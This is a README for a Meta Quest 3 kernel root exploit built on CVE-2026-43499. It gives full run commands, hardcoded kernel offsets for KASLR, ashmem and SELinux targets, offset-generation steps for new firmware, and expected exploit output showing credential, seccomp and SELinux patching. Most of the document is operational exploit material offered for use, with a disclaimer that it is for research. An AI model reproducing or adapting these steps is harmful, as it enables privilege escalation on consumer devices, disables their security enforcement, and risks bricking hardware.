# IonStackQuest3 - Meta Quest 3 Root Exploit

Root exploit for Meta Quest 3, adapted from [IonStack (CVE-2026-43499)](https://github.com/NebuSec/CyberMeowfia).

> ** WARNING: Use at your own risk! This exploit modifies kernel memory and can brick your device.**

---

##  Overview

**IonStackQuest3** is a privilege escalation exploit for the Meta Quest 3 that leverages CVE-2026-43499 (IonStack) to gain root access. It features:

- **Multi-firmware support** - Works on different Quest 3 versions
- **Runtime configuration** - Adjust offsets without recompiling via `ionstack.conf`
- **GitHub Actions auto-generation** - Generate configs for any firmware
- **100% userland** - No kernel modules required
- **KASLR bypass** - Automatically defeats kernel address space randomization
- **SELinux bypass** - Disables SELinux enforcement for su daemon

---

##  Supported Devices

| Device | Incremental | Kernel | Status |
|--------|-------------|--------|--------|
| Meta Quest 3 | `52168470043600520` | `5.10.240-g69827d40d782` |  **Default (Working)** |
| Meta Quest 3 | `52168470052900520` | `5.10.240-g69827d40d782` |  **Working** |
| Meta Quest 3 | *Your version* | `5.10.xxx` | 🔧 **Add via config** |

> **Note:** Kernels with matching version strings are likely to work without re-adaptation.

---

## 🚀 Quick Start

### If Your Firmware Matches the Default (`52168470043600520`)

```bash
# Push the prebuilt binary
adb push preload /data/local/tmp/

# Make executable
adb shell chmod +x /data/local/tmp/preload

# Run the exploit
adb shell /data/local/tmp/preload

# Test root access
adb shell /data/local/tmp/su -c "whoami"
# Should output: root
```

### If Your Firmware Differs

```bash
# 1. Get your firmware version
adb shell getprop ro.build.version.incremental
# Example: 521684700XYZ12345

# 2. Generate ionstack.conf (see Firmware Adaptation section below)

# 3. Push files
adb push preload /data/local/tmp/
adb push ionstack.conf /data/local/tmp/

# 4. Run
adb shell chmod +x /data/local/tmp/preload
adb shell /data/local/tmp/preload
```

---

## Detailed Usage

### Step 1: Obtain `preload` Binary

#### Option A: Download Pre-built Binary
Download the latest `preload` binary from the [Releases](../../releases) page.

#### Option B: Build from Source
```bash
# Clone the repository
git clone https://github.com/yourusername/IonStackQuest3
cd IonStackQuest3

# Build for your target
make PROJECT=eureka-52168470043600520

# Output will be at:
# build/eureka-52168470043600520/bin/preload
```

### Step 2: Obtain `ionstack.conf`

#### Default Firmware (`52168470043600520`)
Skip this step - the binary has the correct offsets built-in.

#### Other Firmware
**Option A: GitHub Actions (Recommended)**
1. Fork this repository
2. Go to **Actions** → **"Generate ionstack.conf"**
3. Click **"Run workflow"**
4. Enter your firmware download URL:
   ```
   https://files.cocaine.trade/firmware/meta/Quest%203/q3_{YOUR_INCREMENTAL}.zip
   ```
5. Download the generated `ionstack.conf` from the workflow artifacts

**Option B: Manual Generation**
```bash
# Download your firmware
wget https://files.cocaine.trade/firmware/meta/Quest%203/q3_{YOUR_INCREMENTAL}.zip
unzip q3_{YOUR_INCREMENTAL}.zip kernel.elf

# Generate config
python3 scripts/gen_ionstack_config.py kernel.elf ionstack ionstack.conf
```

### Step 3: Deploy and Run

```bash
# Push preload
adb push preload /data/local/tmp/

# Push config (skip if using default firmware)
adb push ionstack.conf /data/local/tmp/

# Make executable
adb shell chmod +x /data/local/tmp/preload

# Run exploit
adb shell /data/local/tmp/preload

# If successful, you'll see:
# [+] pipe physrw pid=xxxx done=1 root=1

# Verify root access
adb shell /data/local/tmp/su -c "whoami"
# Output: root
```

---

##  Building from Source

### Prerequisites

- **Android NDK r29** or later
- **Make** build system
- **Git** for cloning
- **Python 3** (for offset generation scripts)

### Install Android NDK

```bash
# Download NDK (Linux example)
wget https://dl.google.com/android/repository/android-ndk-r29-linux.zip
unzip android-ndk-r29-linux.zip
export PATH=$PATH:$(pwd)/android-ndk-r29/bin

# For Windows, download from:
# https://developer.android.com/ndk/downloads
```

### Build Commands

```bash
# Build for default target (52168470043600520)
make

# Build for specific target
make PROJECT=eureka-52168470052900520

# Build with debug symbols
make DEBUG=1 PROJECT=eureka-52168470052900520

# Clean build
make clean && make

# See all available targets
ls src/targets/
```

### Build Output

```
build/
└── eureka-{INCREMENTAL}/
    └── bin/
        └── preload    # Main exploit binary
```

---

##  Firmware Adaptation

### Architecture Overview

```
IonStackQuest3/
├── src/
│   ├── targets/              ← Target-specific offsets
│   │   ├── eureka-52168470043600520/
│   │   │   └── target.h      ← Offsets for that firmware
│   │   └── eureka-52168470052900520/
│   │       └── target.h      ← Offsets for this firmware
│   ├── config.c              ← Runtime overrides
│   ├── preload.c             ← Main exploit logic
│   └── ...
├── ionstack.conf             ← Runtime config (overrides compiled offsets)
└── Makefile                  ← Build system
```

### Adding a New Firmware Target

**Step 1: Create target directory**
```bash
mkdir -p src/targets/eureka-{YOUR_INCREMENTAL}
```

**Step 2: Copy template**
```bash
cp src/targets/eureka-52168470043600520/target.h \
   src/targets/eureka-{YOUR_INCREMENTAL}/target.h
```

**Step 3: Update offsets**
```bash
nano src/targets/eureka-{YOUR_INCREMENTAL}/target.h
```

**Step 4: Build**
```bash
make PROJECT=eureka-{YOUR_INCREMENTAL}
```

### Finding Offsets

#### Method 1: Automated (Recommended)

Use the GitHub Actions workflow or the manual script:

```bash
# Download firmware
wget https://files.cocaine.trade/firmware/meta/Quest%203/q3_{YOUR_INCREMENTAL}.zip
unzip q3_{YOUR_INCREMENTAL}.zip kernel.elf

# Generate config
python3 scripts/gen_ionstack_config.py kernel.elf ionstack ionstack.conf
```

#### Method 2: From Running Device

If you already have root on the device:

```bash
# Get KASLR base from a test run
adb shell /data/local/tmp/preload 2>&1 | grep "base="
# Example: base=ffffffda50600000

# Get runtime addresses
adb shell "cat /proc/kallsyms | grep -E ' ashmem_misc$| init_task$| selinux_state$'"

# Calculate offsets:
# offset = runtime_address - KASLR_BASE
# Example: 0xffffffda52a42198 - 0xffffffda50600000 = 0x02a42198
```

#### Method 3: Manual Symbol Extraction

```bash
# Get kernel text base
adb shell "cat /proc/kallsyms | grep ' _text$'"

# Get specific symbols
adb shell "cat /proc/kallsyms | grep -E ' ashmem_misc$| ashmem_fops$| init_task$'"

# Example output:
# ffffffda52a42198 B selinux_state
# ffffffda527ec200 D init_task
# ffffffda50819688 D ashmem_misc
```

---

##  Offsets Reference

### Critical Offsets in `target.h`

```c
// KASLR / Memory Layout
#define KIMAGE_TEXT_BASE_DEFAULT 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xA8000000ULL

// ASHMEM - Main exploit target
#define ASHMEM_MISC_FOPS_OFF 0x2819688    // miscdevice fops slot
#define ASHMEM_FOPS_OFF 0x01ec7f20        // ashmem_fops table
#define ASHMEM_IOCTL_OFF 0x143a040        // CFI thunks
#define ASHMEM_MMAP_OFF 0x1425460         // ashmem_mmap.cfi_jt
#define ASHMEM_OPEN_OFF 0x1434fe8         // ashmem_open.cfi_jt
#define ASHMEM_RELEASE_OFF 0x1434ff0      // ashmem_release.cfi_jt

// Kernel Variables
#define INIT_TASK_OFF 0x027ec200
#define ROOT_TASK_GROUP_OFF 0x028f0700
#define EMPTY_ZERO_PAGE_OFF 0x028ec000
#define INIT_UTS_NS_OFF 0x02839928

// SELinux (Critical for su daemon)
#define SELINUX_ENFORCING_OFF 0x02a42199  // +1 offset for some kernels
#define SELINUX_BLOB_SIZES_OFF 0x01f044f0
#define SECURITY_HOOK_HEADS_OFF 0x01f02110
#define KMALLOC_CACHES_OFF 0x01f04f30

// Slide Infoleak
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x027e6478
#define SLIDE_SYSCTL_BOOTID_OFF 0x02a4f1d9
#define SLIDE_LOGGERS_0_1_OFF 0x026eed80
#define SLIDE_NFULNL_LOGGER_OFF 0x026eee50
```

### Runtime Override via `ionstack.conf`

```ini
# Example ionstack.conf
kimage_text_base            = 0xffffffc008000000
ashmem_misc_fops_off        = 0x2819688
ashmem_fops_off             = 0x01ec7f20
init_task_off               = 0x027ec200
selinux_enforcing_off       = 0x02a42199
slide_random_boot_id_data_off = 0x027e6478
# ... etc
```

---

##  Troubleshooting

### "su: connect daemon: Permission denied"

**Cause:** SELinux enforcing offset is incorrect.

**Fix:** Try these offsets in order:

```c
#define SELINUX_ENFORCING_OFF 0x02a42199  // +1 (most common)
#define SELINUX_ENFORCING_OFF 0x02a4219c  // +4 (if padded)
#define SELINUX_ENFORCING_OFF 0x026b3c9c  // Original (some kernels)
#define SELINUX_ENFORCING_OFF 0x026b3c90  // Runtime variable (others)
```

**Quick workaround:** If you get root but su daemon fails:

```bash
# After exploit runs and gives root:
adb shell /data/local/tmp/preload
# In the root shell (#):
setenforce 0
/data/local/tmp/su --daemon &
exit

# Test:
adb shell /data/local/tmp/su -c "whoami"
# Should output: root
```

### "cfi write ret=-1 errno=22"

**Cause:** ASHMEM_MISC_FOPS_OFF is incorrect.

**Fix:** Check your kernel's ashmem symbols:

```bash
adb shell "cat /proc/kallsyms | grep ashmem_misc"
# offset = address - KASLR_BASE
# Update target.h or ionstack.conf
```

### Device Hangs or Reboots

**Cause:** Exploit race condition failed.

**Fix:** 
1. Force reboot (long-press power button)
2. Wait for device to fully boot
3. Try again - success rate is highest right after boot

### "Permission denied" when pushing files

**Fix:** 
1. Make sure USB Debugging is enabled
2. Accept the RSA fingerprint prompt on device
3. Check if ADB has proper permissions:
   ```bash
   adb kill-server
   adb start-server
   adb devices
   ```

### Build fails with "unknown PROJECT"

**Cause:** Target directory doesn't exist.

**Fix:**
```bash
# Check available targets
ls src/targets/

# Create target if missing
mkdir -p src/targets/eureka-{YOUR_INCREMENTAL}
cp src/targets/eureka-52168470043600520/target.h \
   src/targets/eureka-{YOUR_INCREMENTAL}/target.h
# Update offsets, then build
make PROJECT=eureka-{YOUR_INCREMENTAL}
```

### "Cannot connect to su daemon"

**Fix:** Restart the daemon manually:
```bash
# As root:
killall su
/data/local/tmp/su --daemon &
```

---

##  Success Indicators

### Expected Output

```
[+] preload starting pid=xxxx
[*] ksym config: applied 28 overrides from /data/local/tmp/ionstack.conf
[+] startup context pid=xxxx uid=2000 euid=2000 ...
[+] slide-kaslr-ok pid=xxxx base=xxxxxxxxxxxxxxxx slide=xxxxxxxxxxxxxxxx
[+] KernelSnitch mm_struct leak 0x...
[*] root seccomp patched ok=1
[*] root cred patched uid=0/0 sid=1/1
[*] root caps patched ...
[*] root selinux direct write ok=1 1->0
[*] root child result done=1 uid_after=0
[+] pipe-physrw-summary pid=xxxx done=1 root=1 kaslr=1
[+] pipe physrw pid=xxxx done=1 root=1 uid=2000->0
[+] su daemon running with pid=xxxx
```

### Verify Root Access

```bash
# Test 1: Check UID
adb shell /data/local/tmp/su -c "id"
# Expected: uid=0(root) gid=0(root) ...

# Test 2: Run a root command
adb shell /data/local/tmp/su -c "whoami"
# Expected: root

# Test 3: Get interactive shell
adb shell /data/local/tmp/su
# Prompt should change to: eureka:/ #

# Test 4: Verify SELinux state
adb shell /data/local/tmp/su -c "getenforce"
# Expected: Permissive
```

---

##  Security Considerations

**This exploit gives TEMP ROOT ACCESS to your device.**

### If Something Goes Wrong:
1. Force reboot (hold power button for 10+ seconds)
2. If boot loops occur: boot into recovery mode
3. Factory reset as last resort
4. Contact Meta support if hardware is affected

---

##  Contributing

### Adding New Firmware Versions

If you have a Quest 3 firmware that isn't listed, please contribute!

**1. Get your firmware version:**
```bash
adb shell getprop ro.build.version.incremental
```

**2. Generate offsets:**
```bash
# Download your firmware
wget https://files.cocaine.trade/firmware/meta/Quest%203/q3_{YOUR_INCREMENTAL}.zip
unzip q3_{YOUR_INCREMENTAL}.zip kernel.elf
python3 scripts/gen_ionstack_config.py kernel.elf ionstack ionstack.conf
```

**3. Create a target:**
```bash
mkdir -p src/targets/eureka-{YOUR_INCREMENTAL}
cp src/targets/eureka-52168470043600520/target.h \
   src/targets/eureka-{YOUR_INCREMENTAL}/target.h
# Update target.h with your offsets
```

**4. Submit a Pull Request with your new target!**

### Reporting Issues

Please include:
- Your Quest 3 firmware version
- Complete exploit output (logcat)
- Kernel version (`adb shell uname -a`)
- Steps to reproduce
---

## 📚 Credits

- **[CyberMeowfia](https://github.com/NebuSec/CyberMeowfia)** — Original IonStack (CVE-2026-43499) exploit
- **[@zhuowei/cheese](https://github.com/zhuowei/cheese)** — Key adaptation info
- **[kernelsnitch](https://github.com/lukasmaar/kernelsnitch)** — Kernel module for leak
- **[Google Project Zero](https://googleprojectzero.blogspot.com/)** — Original research on KASLR bypass

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2026 IonStackQuest3 Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Final Notes

**This exploit is the result of extensive research and testing.** While it works reliably on supported devices, always:

1. **Read the documentation thoroughly** before running
2. **Back up your data** before experimenting
3. **Understand the risks** involved in kernel-level exploits
4. **Use responsibly** - this is for research and educational purposes

---

*Made with ❤️ by the Quest 3 modding community*
